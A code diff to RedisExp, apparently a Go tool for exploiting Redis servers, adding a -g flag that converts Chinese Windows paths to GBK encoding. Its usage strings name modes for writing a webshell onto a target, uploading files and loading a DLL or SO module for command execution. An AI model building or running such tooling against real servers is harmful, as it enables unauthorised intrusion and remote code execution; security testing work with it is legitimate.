@@ -31,7 +31,7 @@ var (
 	redisDir, redisDBFilename                          string
 	command, rpath, rfile, lfile, webshell, user       string
 	execTemplate, execName                             string
-	b64                                                bool
+	b64, gbk                                           bool
 )
 
 func init() {
@@ -68,6 +68,7 @@ cli     执行 Redis 命令
 	flag.StringVar(&user, "u", "root", "设置 ssh 用户名")
 
 	flag.BoolVar(&b64, "b", false, "对 webshell, ssh公钥等内容进行Base64解码")
+	flag.BoolVar(&gbk, "g", false, "windows 使用中文路径需要设置 -g")
 
 	flag.StringVar(&execTemplate, "t", "system.exec", "dll 或 so 命令执行函数")
 	flag.StringVar(&execName, "n", "system", "dll 或 so 函数名字")
@@ -132,8 +133,11 @@ func main() {
 
 		case "shell":
 			if rpath == "" || rfile == "" || webshell == "" {
-				fmt.Println("参数错误: RedisExp.exe -m shell -r 目标IP -p 目标端口 -w 密码 -rp 目标路径 -rf 目标文件名 -s Webshell内容")
+				fmt.Println("参数错误: RedisExp.exe -m shell -r 目标IP -p 目标端口 -w 密码 -rp 目标路径 -rf 目标文件名 -s Webshell内容 [中文路径需要 -g 参数]")
 				return
+			}
+			if gbk {
+				rpath = Utf8ToGbk(rpath)
 			}
 
 			echoShell(rpath, rfile, webshell)
@@ -167,6 +171,10 @@ func main() {
 				return
 			}
 
+			if gbk {
+				rpath = Utf8ToGbk(rpath)
+			}
+
 			if strings.EqualFold(rfile, "") {
 				rfile = "exp.dll"
 			}
@@ -185,6 +193,10 @@ func main() {
 			if strings.EqualFold(lhost, "") || strings.EqualFold(rfile, "") || strings.EqualFold(lfile, "") {
 				fmt.Println("参数错误: RedisExp.exe -m upload -r 目标IP -p 目标端口 -w 密码 -L 本地IP -P 本地Port -rp 目标路径 -rf 目标文件名 -lf 本地文件")
 				return
+			}
+
+			if gbk {
+				rpath = Utf8ToGbk(rpath)
 			}
 
 			redisUpload(lhost, lport, rpath, rfile, lfile)
@@ -206,6 +218,9 @@ func main() {
 			if rfile == "" {
 				fmt.Println("参数错误: RedisExp.exe -m dir -r 目标IP -p 目标端口 -w 密码 -rf 目标文件名[绝对路径]")
 				return
+			}
+			if gbk {
+				rfile = Utf8ToGbk(rfile)
 			}
 
 			res := configSet("dir", rfile)
@@ -307,7 +322,7 @@ func configSet(str, data string) string {
 func cliInfo(commandLine string) {
 	//fmt.Printf("%s:%s> %s\n", rhost, rport, commandLine)
 
-	fmt.Println(">>>", commandLine)
+	fmt.Println(">>>", GbkToUtf8(commandLine))
 	cli(commandLine)
 }
 
@@ -315,7 +330,7 @@ func cliInfo(commandLine string) {
 func cli(commandLine string) {
 	result, err := redisCmd(commandLine)
 	if err != nil {
-		fmt.Println("Error:", err)
+		fmt.Println("Error:", GbkToUtf8(err.Error()))
 		return
 	}
 
